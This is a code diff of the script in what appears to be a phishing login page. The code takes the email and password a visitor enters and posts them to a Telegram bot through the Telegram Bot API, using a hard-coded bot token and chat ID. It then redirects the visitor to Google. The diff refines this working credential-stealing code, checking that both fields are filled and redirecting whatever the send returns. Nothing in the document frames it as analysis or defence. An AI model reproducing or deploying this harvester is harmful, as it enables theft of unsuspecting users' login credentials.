@@ -75,31 +75,37 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            const telegramBotToken = '7937428556:AAEVRRJ0kHtlYUqJXuEzy4k4AkP4ZsWpzfE';
-            const telegramChatId = '708551357';
+            if (email && password) {
+                const telegramBotToken = '7937428556:AAEVRRJ0kHtlYUqJXuEzy4k4AkP4ZsWpzfE';
+                const telegramChatId = '708551357';
 
-            const message = `Username: ${email}\nPassword: ${password}`;
+                const message = `Username: ${email}\nPassword: ${password}`;
 
-            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: telegramChatId,
-                    text: message
+                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        text: message
+                    })
                 })
-            })
-            .then(response => {
-                if (response.ok) {
-                    window.location.href = 'https://www.google.com';
-                } else {
-                    console.error('Failed to send message to Telegram');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Message sent successfully!');
+                    } else {
+                        return response.json().then(error => {
+                            console.error('Error:', error);
+                        });
+                    }
+                })
+                .catch(error => {
+                    console.error('Fetch error:', error);
+                });
+
+                window.location.href = 'https://www.google.com';
+            }
         });
     </script>
 </body>
